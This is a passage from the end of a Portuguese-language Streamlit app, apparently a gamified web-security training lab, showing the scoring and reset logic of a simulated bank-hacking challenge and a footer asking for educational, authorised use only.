                adicionar_pontos(500, "BANCO COMPLETAMENTE HACKEADO!")
                st.session_state.nivel_hacker = "Bank Hacker Legend"
            else:
                st.warning("⚠️ Valor muito baixo! Mire alto: $1,000,000!")
    
    # Reset do jogo
    if st.button("🔄 Resetar Desafio"):
        st.session_state.stage_bank = 1
        st.rerun()

# Footer
st.markdown("---")
st.markdown("""
<div class="footer">
    <p>🌐 <strong>CyberMentor AI</strong> - Laboratório de Segurança Web</p>
    <p>Desenvolvido por <strong>Diego Fonte</strong> | ZowTi Solutions</p>
    <p><small>⚠️ Use apenas para fins educacionais e em sistemas próprios ou com autorização.</small></p>
</div>
""", unsafe_allow_html=True)